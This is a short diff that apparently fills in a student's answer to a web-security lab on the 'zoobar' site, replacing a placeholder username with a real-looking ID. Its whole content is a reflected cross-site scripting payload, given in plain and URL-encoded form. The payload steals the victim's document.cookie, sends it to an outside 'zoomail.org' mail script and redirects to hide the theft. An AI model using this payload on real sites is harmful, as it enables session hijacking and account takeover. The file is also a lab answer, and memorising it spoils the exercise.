@@ -1,3 +1,3 @@
-http://zoobar.org/users.php?user="><script>new Image().src='http://zoomail.org/sendmail.php?netid=yourieng6username&payload='+document.cookie+'&random='+Math.random();document.location='/users.php';</script>
+http://zoobar.org/users.php?user="><script>new Image().src='http://zoomail.org/sendmail.php?netid=pmcollins2&payload='+document.cookie+'&random='+Math.random();document.location='/users.php';</script>
 
-http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Enew\%20Image().src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3Fnetid\%3Dyourieng6username\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random()\%3Bdocument.location\%3D\%27\%2Fusers.php\%27\%3B\%3C\%2Fscript\%3E
+http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Enew\%20Image().src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3Fnetid\%3Dpmcollins2\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random()\%3Bdocument.location\%3D\%27\%2Fusers.php\%27\%3B\%3C\%2Fscript\%3E
